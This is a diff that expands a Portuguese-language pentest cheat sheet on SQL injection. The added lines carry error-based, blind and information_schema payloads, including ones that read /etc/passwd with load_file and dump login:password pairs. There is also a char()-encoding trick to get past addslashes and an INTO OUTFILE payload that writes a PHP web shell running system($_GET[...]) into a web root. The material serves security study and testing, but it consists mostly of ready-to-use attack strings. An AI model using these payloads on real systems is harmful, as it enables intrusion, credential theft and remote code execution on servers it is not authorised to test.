@@ -34,14 +34,45 @@ Para testar se existe um SQL Injection, um método é colocar o contrabarra ou u
 ### Error Based
 O Error Based, como o próprio nome diz, é baseado nos erro que retorna ao tentar fazer uma consulta no banco de dados em algum campo. Com ele, é possível injetar códigos SQL para descobrir informações sobre a tabela e o banco de dados.
 
-Exemplo:' union select 1,2,3... %23'
-Exemplo:' order by 1 or 2 or 3...'
+Exemplo: ' union select 1,2,3... %23'
+Exemplo: ' order by 1 or 2 or 3...'
+Exemplo: union select 1, column_name, load_file(”/etc/passwd”), 4, from information_schema.columns where table_schema=”database” and table_name=”users” %23
+
+### Blind
+Quando não se há indicações se existe um SQL Injection, pode se usar alguns testes  para verificar a lógica AND e OR do programa.
+
+Exemplo: ' or 1=1 union select 1,2#
+
+#### Blind Post
+Para descobrir informações confidenciais do servidor através da lógica, é possível utilizar-se da função ascii para descobrir o nome da base de dados em que a aplicações está, por isso é muito comum usar o Burp Suite no modo Repeater para fazer as requisições.
+
+Exemplo: ' or length(database()) = 7 #
+Exemplo: ' or ascii(substring(database(),1,1)) == number ascii for letter # 
+Exemplo: ' or database() = char(115,116,114,105,110,103) # 
+
+#### SQLi to RCE
+Com a injeção de comandos SQL, é possível escrever dados no servidor com o comando INTO OUTFILE e o caminho do diretório que você deseja salvar.
+
+Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/html/website/file.txt” %23
+
+Exemplo: ‘ union all select 1,2,3,4, “<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23
 
 ### Information Schema
 Através do information Schema, é possível obter a tabela com usuários e senhas do sistema e obter as informações contidas nela.
 
-Exemplo:' union select 1,2, table_name,4,5 from information_schema.tables %23
-Exemplo:' union select 1,2,concat(login,':',senha),4,5 from table %23
+Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23
+Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23
+
+### Bypass addslashes
+Em alguns casos, por causa do jeito em que foi programado a consultado no banco de dados, vai adicionar algumas contrabarras na consulta, impossibilitando de fazer consultas com aspas simples, gerando um erro. Porém, umas das formas de burlar esse mecanismos, é passar os valores da string em decimal separados por vírgulas com a função char().
+
+Exemplo: echo -n “string” | od -An -tdC
+
+Exemplo:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)
+
+Site: [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)
+
+
 ## Full Path Disclosure | Path Traversal | Directory Traversal
 O Path Traversal ou Directory Traversal é uma vulnerabilidade que ocorre quando é se é possível navegar entre os diretórios através de um parâmetro GET pela URL utilizando o "../" para listar todos os diretórios anteriores. Através dessa vulnerabilidade é possível encontrar arquivos sensíveis que se colocados na URL pode-se ver o conteúdo deles e encontrar informações confidenciais
 ## Local File Inclusion (LFI)
